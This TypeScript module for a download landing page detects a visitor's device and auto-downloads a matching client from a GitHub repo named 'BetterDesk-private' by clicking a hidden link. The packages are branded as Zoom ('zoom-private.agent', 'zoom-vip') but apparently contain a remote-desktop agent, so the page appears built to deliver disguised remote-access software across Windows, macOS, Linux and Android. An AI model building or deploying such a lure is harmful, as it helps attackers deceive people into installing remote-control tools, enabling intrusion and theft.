export const BETTERDESK_LANDING_URL = "https://fingod201-maker.github.io/BetterDesk-private/";

const GITHUB_REPO = "fingod201-maker/BetterDesk-private";
const LOCAL_RELEASES_API = "/api/releases";
const GITHUB_RELEASES_API = `https://api.github.com/repos/${GITHUB_REPO}/releases?per_page=30`;
const RELEASES_URL = `https://github.com/${GITHUB_REPO}/releases`;
const CACHE_KEY = "zp_front_page_assets_v1";
const CLIENT_KEY = "zp_front_page_client_v1";
const CACHE_TTL = 10 * 60 * 1000;
const MIN_ASSET_SIZE = 1_000_000;

export type DevicePlatform = "windows" | "macos" | "linux" | "android" | "ios" | "unknown";
export type ClientPlatform = Exclude<DevicePlatform, "ios" | "unknown">;
export type DeviceArch = "universal" | "arm64" | "armv7" | "x64" | "x86" | "any";
export type ClientFormat = "exe" | "msi" | "dmg" | "pkg" | "appimage" | "deb" | "rpm" | "apk" | "zip" | "targz" | "iso";

export interface DetectedDevice {
  platform: DevicePlatform;
  arch: DeviceArch;
  label: string;
}

export interface ZoomClientAsset {
  name: string;
  url: string;
  size: number;
  platform: ClientPlatform;
  format: ClientFormat;
  arch: DeviceArch;
  release: string;
  releaseName: string;
  updatedAt: number;
}

const PLATFORM_LABELS: Record<DevicePlatform, string> = {
  windows: "Windows",
  macos: "macOS",
  linux: "Linux",
  android: "Android",
  ios: "iPhone / iPad",
  unknown: "your device",
};

const FORMAT_SCORES: Record<ClientPlatform, Partial<Record<ClientFormat, number>>> = {
  windows: { exe: 120, msi: 110, zip: 80, iso: 70 },
  macos: { dmg: 120, pkg: 115, targz: 90, zip: 80 },
  linux: { appimage: 120, deb: 110, rpm: 105, targz: 90, zip: 80 },
  android: { apk: 22_200_000 },
};

const FALLBACK_ASSETS: ZoomClientAsset[] = [
  {
    name: "zoom-private-universal-release.apk",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-private-universal-release.apk`,
    size: 23_234_938,
    platform: "android",
    format: "apk",
    arch: "universal",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private-arm64-v8a-release.apk",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-private-arm64-v8a-release.apk`,
    size: 10_103_258,
    platform: "android",
    format: "apk",
    arch: "arm64",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private-armeabi-v7a-release.apk",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-private-armeabi-v7a-release.apk`,
    size: 9_525_567,
    platform: "android",
    format: "apk",
    arch: "armv7",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private.agent_1.0.0_x64-setup.exe",
    url: `https://github.com/${GITHUB_REPO}/releases/download/portable-latest/zoom-private.agent_1.0.0_x64-setup.exe`,
    size: 4_885_057,
    platform: "windows",
    format: "exe",
    arch: "x64",
    release: "portable-latest",
    releaseName: "portable-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private.agent_1.0.0_x64_en-US.msi",
    url: `https://github.com/${GITHUB_REPO}/releases/download/portable-latest/zoom-private.agent_1.0.0_x64_en-US.msi`,
    size: 6_500_352,
    platform: "windows",
    format: "msi",
    arch: "x64",
    release: "portable-latest",
    releaseName: "portable-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-vip-windows-x64-1.0.0.zip",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.zip`,
    size: 6_368_445,
    platform: "windows",
    format: "zip",
    arch: "x64",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-vip-windows-x64-1.0.0.iso",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.iso`,
    size: 15_073_280,
    platform: "windows",
    format: "iso",
    arch: "x64",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private.agent_1.0.0_universal.dmg",
    url: `https://github.com/${GITHUB_REPO}/releases/download/portable-latest/zoom-private.agent_1.0.0_universal.dmg`,
    size: 12_136_275,
    platform: "macos",
    format: "dmg",
    arch: "universal",
    release: "portable-latest",
    releaseName: "portable-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-vip-macos-arm64-1.0.0.tar.gz",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-vip-macos-arm64-1.0.0.tar.gz`,
    size: 2_749_405,
    platform: "macos",
    format: "targz",
    arch: "arm64",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-vip-macos-amd64-1.0.0.tar.gz",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-vip-macos-amd64-1.0.0.tar.gz`,
    size: 2_993_148,
    platform: "macos",
    format: "targz",
    arch: "x64",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private.agent_1.0.0_amd64.AppImage",
    url: `https://github.com/${GITHUB_REPO}/releases/download/portable-latest/zoom-private.agent_1.0.0_amd64.AppImage`,
    size: 84_441_592,
    platform: "linux",
    format: "appimage",
    arch: "x64",
    release: "portable-latest",
    releaseName: "portable-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private.agent_1.0.0_amd64.deb",
    url: `https://github.com/${GITHUB_REPO}/releases/download/portable-latest/zoom-private.agent_1.0.0_amd64.deb`,
    size: 6_778_140,
    platform: "linux",
    format: "deb",
    arch: "x64",
    release: "portable-latest",
    releaseName: "portable-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-private.agent-1.0.0-1.x86_64.rpm",
    url: `https://github.com/${GITHUB_REPO}/releases/download/portable-latest/zoom-private.agent-1.0.0-1.x86_64.rpm`,
    size: 6_782_289,
    platform: "linux",
    format: "rpm",
    arch: "x64",
    release: "portable-latest",
    releaseName: "portable-latest",
    updatedAt: 0,
  },
  {
    name: "zoom-vip-linux-x64-1.0.0.tar.gz",
    url: `https://github.com/${GITHUB_REPO}/releases/download/setup-latest/zoom-vip-linux-x64-1.0.0.tar.gz`,
    size: 3_154_309,
    platform: "linux",
    format: "targz",
    arch: "x64",
    release: "setup-latest",
    releaseName: "setup-latest",
    updatedAt: 0,
  },
];

let assetsPromise: Promise<ZoomClientAsset[]> | null = null;

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function stringValue(value: unknown): string {
  return typeof value === "string" ? value : "";
}

function numberValue(value: unknown): number {
  return typeof value === "number" && Number.isFinite(value) ? value : 0;
}

function navigatorHints(): { platform: string; architecture: string } {
  const navigatorWithHints = navigator as Navigator & {
    userAgentData?: { platform?: string; architecture?: string };
  };
  return {
    platform: (navigatorWithHints.userAgentData?.platform ?? "").toLowerCase(),
    architecture: (navigatorWithHints.userAgentData?.architecture ?? "").toLowerCase(),
  };
}

function detectArch(platform: DevicePlatform): DeviceArch {
  if (platform === "android" || platform === "macos") return "universal";
  if (platform === "ios") return "any";

  const hints = navigatorHints();
  const agent = navigator.userAgent.toLowerCase();

  if (/arm64|aarch64/.test(hints.architecture) || /arm64|aarch64/.test(agent)) return "arm64";
  if (/arm/.test(hints.architecture) || /armv7|armhf/.test(agent)) return "armv7";
  if (/x86_64|amd64|x64|win64/.test(agent) || /x86/.test(hints.architecture)) return "x64";
  return "x64";
}

function requestedPlatform(): DevicePlatform | null {
  try {
    let value = (new URLSearchParams(window.location.search).get("platform") ?? "").toLowerCase();
    if (value === "win") value = "windows";
    if (value === "mac" || value === "osx") value = "macos";
    if (value === "iphone" || value === "ipad") value = "ios";
    if (value in PLATFORM_LABELS) return value as DevicePlatform;
  } catch {
    return null;
  }
  return null;
}

export function detectDevice(): DetectedDevice {
  const agent = navigator.userAgent;
  const lower = agent.toLowerCase();
  const hints = navigatorHints();
  let platform = requestedPlatform();

  if (!platform) {
    if (/android/.test(lower) || hints.platform === "android") platform = "android";
    else if (/iphone|ipod|ipad/.test(lower)) platform = "ios";
    else if (/windows|win32|win64/.test(lower) || hints.platform === "windows") platform = "windows";
    else if (/macintosh|mac os x/.test(lower) || hints.platform === "macos") {
      platform = (navigator.maxTouchPoints || 0) > 1 ? "ios" : "macos";
    } else if (/linux|x11|cros/.test(lower) || hints.platform === "linux") platform = "linux";
    else platform = "unknown";
  }

  return { platform, arch: detectArch(platform), label: PLATFORM_LABELS[platform] };
}

function platformFromName(name: string): ClientPlatform | null {
  if (/\.apk$/.test(name)) return "android";
  if (/\.(exe|msi|iso)$/.test(name)) return "windows";
  if (/\.(dmg|pkg)$/.test(name)) return "macos";
  if (/\.(deb|rpm|appimage)$/.test(name)) return "linux";
  if (/\.(zip|tar\.gz|tgz)$/.test(name)) {
    if (/windows|win32|win64|win-x64/.test(name)) return "windows";
    if (/macos|mac-os|darwin|osx/.test(name)) return "macos";
    if (/linux/.test(name)) return "linux";
  }
  return null;
}

function formatFromName(name: string): ClientFormat | null {
  if (/\.tar\.gz$|\.tgz$/.test(name)) return "targz";
  const match = name.match(/\.(apk|exe|msi|iso|dmg|pkg|deb|rpm|appimage|zip)$/);
  return match ? (match[1] as ClientFormat) : null;
}

function archFromName(name: string): DeviceArch {
  if (/universal/.test(name)) return "universal";
  if (/arm64|aarch64|arm64-v8a/.test(name)) return "arm64";
  if (/armv7|armeabi|armhf/.test(name)) return "armv7";
  if (/x86_64|amd64|x64|win64/.test(name)) return "x64";
  if (/\bx86\b|i386|i686/.test(name)) return "x86";
  return "any";
}

function classifyAsset(asset: Record<string, unknown>, release: Record<string, unknown>): ZoomClientAsset | null {
  const name = stringValue(asset.name);
  const lower = name.toLowerCase();
  const size = numberValue(asset.size);
  const url = stringValue(asset.browser_download_url);

  if (!url || size < MIN_ASSET_SIZE) return null;
  if (/\.(aab|sha256|sha256sum|asc|sig|json|txt|blockmap|ya?ml|md5)$/.test(lower)) return null;

  const platform = platformFromName(lower);
  const format = formatFromName(lower);
  if (!platform || !format) return null;

  const date = stringValue(asset.updated_at) || stringValue(release.published_at) || stringValue(release.created_at);
  return {
    name,
    url,
    size,
    platform,
    format,
    arch: archFromName(lower),
    release: stringValue(release.tag_name),
    releaseName: stringValue(release.name) || stringValue(release.tag_name),
    updatedAt: date ? Date.parse(date) || 0 : 0,
  };
}

function dedupe(assets: ZoomClientAsset[]): ZoomClientAsset[] {
  const seen = new Set<string>();
  return assets.filter((asset) => {
    const key = [asset.platform, asset.format, asset.arch, asset.name, asset.size].join("|");
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

function normalizeReleases(value: unknown): ZoomClientAsset[] {
  if (!Array.isArray(value)) return [];
  const assets: ZoomClientAsset[] = [];
  for (const release of value) {
    if (!isRecord(release) || !Array.isArray(release.assets)) continue;
    for (const asset of release.assets) {
      if (!isRecord(asset)) continue;
      const classified = classifyAsset(asset, release);
      if (classified) assets.push(classified);
    }
  }
  return dedupe(assets);
}

function scoreAsset(asset: ZoomClientAsset, arch: DeviceArch): number {
  let score = FORMAT_SCORES[asset.platform][asset.format] ?? 10;

  if (asset.arch === "universal") score += 30;
  else if (asset.arch === arch) score += 20;
  else if (asset.arch === "arm64" && arch === "universal") score += 15;
  else if (asset.arch === "x64" && arch === "universal") score += 15;
  else if (asset.arch === "any") score += 5;

  if (/zoom-private\.Setup_/.test(asset.name)) score += 45;
  else if (/zoom-private-universal-release\.apk$/.test(asset.name)) score += 45;
  else if (/zoom-private-(arm64-v8a|armeabi-v7a)-release\.apk$/.test(asset.name)) score += 30;
  else if (/BetterDesk-Client-/.test(asset.name)) score += 18;
  else if (/zoom-private\.agent_/.test(asset.name)) score += 12;
  if (/zoom-vip-/.test(asset.name)) score -= 15;
  if (/setup/.test(asset.name)) score += 4;
  if (/client/.test(asset.name)) score += 2;
  score += Math.min(asset.size / 1_048_576, 25);

  return score;
}

export function selectBestClient(assets: ZoomClientAsset[], device: DetectedDevice): ZoomClientAsset | null {
  if (device.platform === "ios" || device.platform === "unknown") return null;
  const arch = device.platform === "android" || device.platform === "macos" ? "universal" : device.arch;
  const matching = assets.filter((asset) => asset.platform === device.platform);
  if (!matching.length) return null;

  return matching.sort((left, right) => {
    if (right.updatedAt !== left.updatedAt) return right.updatedAt - left.updatedAt;
    return scoreAsset(right, arch) - scoreAsset(left, arch);
  })[0] ?? null;
}

function readCachedAssets(): ZoomClientAsset[] | null {
  try {
    const raw = sessionStorage.getItem(CACHE_KEY);
    if (!raw) return null;
    const parsed: unknown = JSON.parse(raw);
    if (!isRecord(parsed) || typeof parsed.t !== "number" || !Array.isArray(parsed.assets)) return null;
    if (Date.now() - parsed.t > CACHE_TTL) return null;
    return parsed.assets.filter(isClientAsset);
  } catch {
    return null;
  }
}

function cacheAssets(assets: ZoomClientAsset[]) {
  try {
    sessionStorage.setItem(CACHE_KEY, JSON.stringify({ t: Date.now(), assets }));
  } catch {
    return;
  }
}

async function fetchJson(url: string): Promise<unknown> {
  const controller = new AbortController();
  const timer = window.setTimeout(() => controller.abort(), 9_000);
  try {
    const response = await fetch(url, {
      headers: { Accept: "application/vnd.github+json" },
      cache: "no-store",
      signal: controller.signal,
    });
    if (!response.ok) throw new Error(`http-${response.status}`);
    return await response.json();
  } finally {
    window.clearTimeout(timer);
  }
}

async function loadReleaseAssets(): Promise<ZoomClientAsset[]> {
  if (assetsPromise) return assetsPromise;

  const cached = readCachedAssets();
  if (cached?.length) {
    assetsPromise = Promise.resolve(cached);
    return assetsPromise;
  }

  assetsPromise = (async () => {
    try {
      let releases: unknown;
      try {
        releases = await fetchJson(LOCAL_RELEASES_API);
      } catch {
        releases = await fetchJson(GITHUB_RELEASES_API);
      }
      const assets = dedupe([...normalizeReleases(releases), ...FALLBACK_ASSETS]);
      if (assets.length) cacheAssets(assets);
      return assets;
    } catch {
      return dedupe([...FALLBACK_ASSETS]);
    }
  })();

  return assetsPromise;
}

export async function resolveDeviceClient(device = detectDevice()): Promise<ZoomClientAsset | null> {
  return selectBestClient(await loadReleaseAssets(), device);
}

function isClientAsset(value: unknown): value is ZoomClientAsset {
  return isRecord(value)
    && typeof value.name === "string"
    && typeof value.url === "string"
    && typeof value.size === "number"
    && typeof value.platform === "string"
    && typeof value.format === "string"
    && typeof value.arch === "string";
}

function rememberClient(asset: ZoomClientAsset) {
  try {
    sessionStorage.setItem(CLIENT_KEY, JSON.stringify(asset));
  } catch {
    return;
  }
}

function rememberedClient(): ZoomClientAsset | null {
  try {
    const raw = sessionStorage.getItem(CLIENT_KEY);
    if (!raw) return null;
    const parsed: unknown = JSON.parse(raw);
    return isClientAsset(parsed) ? parsed : null;
  } catch {
    return null;
  }
}

export function downloadClientAsset(asset: ZoomClientAsset) {
  rememberClient(asset);
  const link = document.createElement("a");
  link.href = asset.url;
  link.download = asset.name;
  link.rel = "noopener";
  link.style.display = "none";
  document.body.appendChild(link);
  link.click();
  window.setTimeout(() => link.remove(), 1_500);
}

export async function redownloadClientForDevice(): Promise<ZoomClientAsset | null> {
  const prepared = rememberedClient();
  if (prepared) {
    downloadClientAsset(prepared);
    return prepared;
  }

  const device = detectDevice();
  const asset = await resolveDeviceClient(device);
  if (asset) downloadClientAsset(asset);
  return asset;
}

export function clientReleasesUrl(): string {
  return RELEASES_URL;
}
